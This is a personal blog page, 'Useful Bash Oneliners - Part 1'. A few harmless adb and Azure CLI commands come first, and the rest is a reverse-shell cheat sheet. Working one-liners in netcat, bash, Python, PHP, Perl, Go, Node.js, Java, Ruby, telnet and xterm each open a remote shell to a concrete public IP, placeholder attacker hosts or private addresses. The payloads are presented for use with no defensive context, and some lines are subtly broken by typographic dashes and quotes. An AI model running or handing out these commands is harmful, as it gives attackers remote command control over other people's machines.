<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=content-language content="en"><meta name=color-scheme content="light dark"><meta name=author content="Ian Ovenell"><meta name=description content="Dump mobile tabs from brave via adb
adb forward tcp:9222 localabstract:chrome_devtools_remote; \ curl http://localhost:9222/json/list | \ jq -r &#34;.[] | \&#34;[\&#34; + .title + \&#34;](\&#34; + .url + \&#34;)\&#34; + \&#34; \&#34;&#34; \ > brave.mobile.tabs.md Dump mobile tabs from chrome via adb
adb forward tcp:9222 localabstract:chrome_devtools_remote_13720; \ curl http://localhost:9222/json/list | \ jq -r &#34;.[] | \&#34;[\&#34; + .title + \&#34;](\&#34; + .url + \&#34;)\&#34; + \&#34; \&#34;&#34; \ > chrome.mobile.tabs.md Login into Azure CLI as a service principal"><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="Useful Bash Oneliners - Part 1"><meta name=twitter:description content="Dump mobile tabs from brave via adb
adb forward tcp:9222 localabstract:chrome_devtools_remote; \ curl http://localhost:9222/json/list | \ jq -r &#34;.[] | \&#34;[\&#34; + .title + \&#34;](\&#34; + .url + \&#34;)\&#34; + \&#34; \&#34;&#34; \ > brave.mobile.tabs.md Dump mobile tabs from chrome via adb
adb forward tcp:9222 localabstract:chrome_devtools_remote_13720; \ curl http://localhost:9222/json/list | \ jq -r &#34;.[] | \&#34;[\&#34; + .title + \&#34;](\&#34; + .url + \&#34;)\&#34; + \&#34; \&#34;&#34; \ > chrome.mobile.tabs.md Login into Azure CLI as a service principal"><meta property="og:title" content="Useful Bash Oneliners - Part 1"><meta property="og:description" content="Dump mobile tabs from brave via adb
adb forward tcp:9222 localabstract:chrome_devtools_remote; \ curl http://localhost:9222/json/list | \ jq -r &#34;.[] | \&#34;[\&#34; + .title + \&#34;](\&#34; + .url + \&#34;)\&#34; + \&#34; \&#34;&#34; \ > brave.mobile.tabs.md Dump mobile tabs from chrome via adb
adb forward tcp:9222 localabstract:chrome_devtools_remote_13720; \ curl http://localhost:9222/json/list | \ jq -r &#34;.[] | \&#34;[\&#34; + .title + \&#34;](\&#34; + .url + \&#34;)\&#34; + \&#34; \&#34;&#34; \ > chrome.mobile.tabs.md Login into Azure CLI as a service principal"><meta property="og:type" content="article"><meta property="og:url" content="https://ovenell.ninja/notes/useful-bash-oneliners-part-1/"><meta property="article:section" content="notes"><meta property="article:published_time" content="2021-05-30T00:00:00+00:00"><meta property="article:modified_time" content="2021-05-30T00:00:00+00:00"><title>Useful Bash Oneliners - Part 1 · Ian Ovenell</title><link rel=canonical href=https://ovenell.ninja/notes/useful-bash-oneliners-part-1/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.93c41bf1e522f85ecda7355985f09000f71fc1d64dda9f74051b0fa06210e93f.css integrity="sha256-k8Qb8eUi+F7NpzVZhfCQAPcfwdZN2p90BRsPoGIQ6T8=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.f37febc669ce189201c1918fac1948a254686c8d366a312c2d72b2bb71ad97d1.css integrity="sha256-83/rxmnOGJIBwZGPrBlIolRobI02ajEsLXKyu3Gtl9E=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><script defer src=https://twemoji.maxcdn.com/v/13.0.2/twemoji.min.js integrity=sha384-wyB/MspSJ/r2bT2kCj44qtsYRYlpzO2oAPhRj5myrWD63dt6qWv4x8AZe7Fl3K3b crossorigin=anonymous></script><meta name=generator content="Hugo 0.83.1"></head><body class="preload-transitions colorscheme-dark" onload=twemoji.parse(document.body)><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Ian Ovenell</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/posts/>Blog</a></li></ul></section></nav><div class=content><section class="container page"><article><header><h1 class=title><a class=title-link href=https://ovenell.ninja/notes/useful-bash-oneliners-part-1/>Useful Bash Oneliners - Part 1</a></h1></header><p>Dump mobile tabs from brave via adb</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>adb forward tcp:9222 localabstract:chrome_devtools_remote; \
curl http://localhost:9222/json/list | \
jq -r &#34;.[] | \&#34;[\&#34; + .title + \&#34;](\&#34; + .url + \&#34;)\&#34; + \&#34;  \&#34;&#34; \
&gt; brave.mobile.tabs.md
</code></pre></div><p>Dump mobile tabs from chrome via adb</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>adb forward tcp:9222 localabstract:chrome_devtools_remote_13720; \
curl http://localhost:9222/json/list | \
jq -r &#34;.[] | \&#34;[\&#34; + .title + \&#34;](\&#34; + .url + \&#34;)\&#34; + \&#34;  \&#34;&#34; \
&gt; chrome.mobile.tabs.md
</code></pre></div><p>Login into Azure CLI as a service principal</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>az login \
--service-principal \
-u ${ARM_CLIENT_ID} \
-p ${ARM_CLIENT_SECRET} \
--tenant ${ARM_TENANT_ID}
</code></pre></div><p>Search for Azure virtual machines available in a specific region</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>az vm list-sizes -l eastus | grep Standard_N
</code></pre></div><p>start a netcat listener on a server</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>nc -lvp 4444
</code></pre></div><p>create a Mac OSx fifo and fire up a reverse shell</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>mkfifo myfifo &amp;&amp; nc 143.244.150.162 4444 &lt; myfifo | /bin/bash -i &gt; myfifo 2&gt;&amp;1
</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>mkfifo /tmp/lol;nc 143.244.150.162 4444 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol
</code></pre></div><p>netcat reverse shell - Linux</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>nc 143.244.150.162 4444 –e /bin/bash
</code></pre></div><p>netcat reverse shell - Windows</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>nc.exe 143.244.150.162 4444 –e cmd.exe
</code></pre></div><p>bash reverse shell</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>bash -i &gt;&amp; /dev/tcp/143.244.150.162/4444 0&gt;&amp;1
</code></pre></div><p>python reverse shell</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;143.244.150.162&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;
</code></pre></div><p>php reverse shell</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>php -r &#39;$sock=fsockopen(&#34;143.244.150.162&#34;,4444);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);’
</code></pre></div><p>perl reverse shell</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>perl -e &#39;use Socket;$i=&#34;143.244.150.162&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};’
</code></pre></div><p>golang reverse shell</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go>echo <span style=color:red>&#39;</span><span style=color:#fff;font-weight:700>package</span> main;<span style=color:#fff;font-weight:700>import</span><span style=color:#0ff;font-weight:700>&#34;os/exec&#34;</span>;<span style=color:#fff;font-weight:700>import</span><span style=color:#0ff;font-weight:700>&#34;net&#34;</span>;<span style=color:#fff;font-weight:700>func</span> main(){c,_:=net.Dial(<span style=color:#0ff;font-weight:700>&#34;tcp&#34;</span>,<span style=color:#0ff;font-weight:700>&#34;143.244.150.162:4444&#34;</span>);cmd:=exec.Command(<span style=color:#0ff;font-weight:700>&#34;/bin/sh&#34;</span>);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http:<span style=color:#007f7f>//cmd.Run();}&#39;&gt;/tmp/sh.go&amp;&amp;go run /tmp/sh.go
</span></code></pre></div><p>Node.js reverse shell</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>require(&#39;child_process&#39;).exec(&#39;bash -i &gt;&amp; /dev/tcp/143.244.150.162/4444 0&gt;&amp;1&#39;);
</code></pre></div><p>Java reverse shell</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>r = Runtime.getRuntime()
p = r.exec([&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;exec 5&lt;&gt;/dev/tcp/143.244.150.162/4444;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;] as String[])
p.waitFor()
</code></pre></div><p>Ruby reverse shell</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>ruby -rsocket -e&#39;f=TCPSocket.open(&#34;143.244.150.162&#34;,4444).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;
</code></pre></div><p>simple nc variant with two connections:</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>nc localhost 1233 | /bin/sh | nc 127.0.0.1 1234
</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4444 0/tmp/p 2&gt;&amp;1
</code></pre></div><p>Telnet</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet attackerip 4444 0/tmp/p 2&gt;&amp;1
</code></pre></div><p>M$ windows:</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>nc.exe 192.168.100.113 10000 –e cmd.exe
</code></pre></div><p>Bash</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
</code></pre></div><p>perl</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;
</code></pre></div><p>Python</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;
</code></pre></div><p>PHP</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>try fd 4,5,6 if fd 3 is the TCP connection is NOT using file descriptor 3.
php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,1234);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;
</code></pre></div><p>Ruby</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>ruby -rsocket -e&#39;f=TCPSocket.open(&#34;10.0.0.1&#34;,1234).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;
</code></pre></div><p>NC Netcat ( i.e. AWS Linux 2 )</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>nc -e /bin/sh 10.0.0.1 1234
</code></pre></div><p>NC Netcat</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
</code></pre></div><p>i.e.</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>mkfifo mypipe ; cat mypipe|/bin/bash|nc -l -p 6000 &gt;mypipe
</code></pre></div><p>Java</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>r = Runtime.getRuntime()
p = r.exec([&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;] as String[])
p.waitFor()
</code></pre></div><p>xterm</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>xterm -bg black -fg white -display 10.0.0.1:1
</code></pre></div><p>To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).<br>One way to do this is with Xnest (to be run on your system):</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>Xnest :1
</code></pre></div><p>You’ll need to authorise the target to connect to you (command also run on your host):</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>xhost +targetip
</code></pre></div></article></section></div><footer class=footer><section class=container><p>2021</p></section></footer></main><script src=/js/coder.min.235666b114443867d43eeb5799d51f6252965e5163f338285e113fa381d3d27e.js integrity="sha256-I1ZmsRREOGfUPutXmdUfYlKWXlFj8zgoXhE/o4HT0n4="></script><script>(function(e,b,f,c,a,d){b[c]=b[c]||function(){(b[c].q=b[c].q||[]).push(arguments)},a=e.createElement('script'),d=e.getElementsByTagName('script')[0],a.async=1,a.src=f,a.id='fathom-script',d.parentNode.insertBefore(a,d)})(document,window,'//analytics.example.com/tracker.js','fathom'),fathom('set','siteId','ABCDE'),fathom('trackPageview')</script><script async defer data-domain=example.com src=https://analytics.example.com/js/plausible.js></script><script data-goatcounter=https://ovenell-guru.goatcounter.com/count async src=//gc.zgo.at/count.js></script></body></html>